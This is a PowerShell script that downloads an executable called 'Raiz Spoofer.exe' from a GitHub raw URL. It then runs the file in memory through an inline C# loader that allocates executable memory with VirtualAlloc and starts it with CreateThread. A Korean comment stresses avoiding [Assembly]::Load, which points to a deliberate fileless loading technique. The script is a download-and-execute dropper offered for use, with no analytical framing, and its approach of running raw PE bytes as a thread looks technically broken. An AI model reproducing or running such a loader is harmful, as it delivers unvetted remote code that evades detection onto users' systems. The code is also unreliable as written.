$url = "https://raw.githubusercontent.com/tyu0720gyi/service/main/Raiz%20Spoofer.exe"

$source = @"
using System;
using System.Runtime.InteropServices;
public class Loader {
    [DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
    [DllImport("kernel32.dll")] public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
    public static void Run(byte[] data) {
        IntPtr mem = VirtualAlloc(IntPtr.Zero, (uint)data.Length, 0x3000, 0x40);
        Marshal.Copy(data, 0, mem, data.Length);
        uint id;
        IntPtr h = CreateThread(IntPtr.Zero, 0, mem, IntPtr.Zero, 0, out id);
        WaitForSingleObject(h, 0xFFFFFFFF);
    }
}
"@

try {
    Write-Host "[*] Downloading C++ Binary..." -ForegroundColor Cyan
    $bin = (New-Object System.Net.WebClient).DownloadData($url)
    
    # 이 부분이 중요합니다. 기존의 [Assembly]::Load를 절대 쓰지 마세요.
    Write-Host "[*] Injecting Native PE..." -ForegroundColor Cyan
    Add-Type -TypeDefinition $source
    [Loader]::Run($bin)
    
    Write-Host "[+] Executed!" -ForegroundColor Green
} catch {
    Write-Host "[-] ERROR: $($_.Exception.Message)" -ForegroundColor Red
}
